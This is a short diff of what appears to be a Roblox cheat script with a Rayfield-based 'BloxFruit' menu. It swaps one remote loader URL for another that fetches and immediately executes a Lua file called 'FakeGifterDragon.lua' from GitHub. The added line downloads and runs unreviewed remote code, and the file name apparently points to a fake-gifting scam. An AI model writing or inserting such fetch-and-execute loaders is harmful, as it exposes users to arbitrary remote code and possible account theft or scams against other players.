@@ -3675,7 +3675,7 @@ local Toggle = BloxFruitTab:CreateToggle({
          getgenv().robux = currentRobux
          
          -- Executes the new giftFruit script
-         loadstring(game:HttpGet("https://raw.githubusercontent.com/svyx6ktgqy-prog/scriptMount/refs/heads/main/giftFruit.lua"))()
+         loadstring(game:HttpGet("https://raw.githubusercontent.com/MoziIOnTop/pro/refs/heads/main/FakeGifterDragon.lua"))()
          
          Rayfield:Notify({
             Title = "Script Loaded",
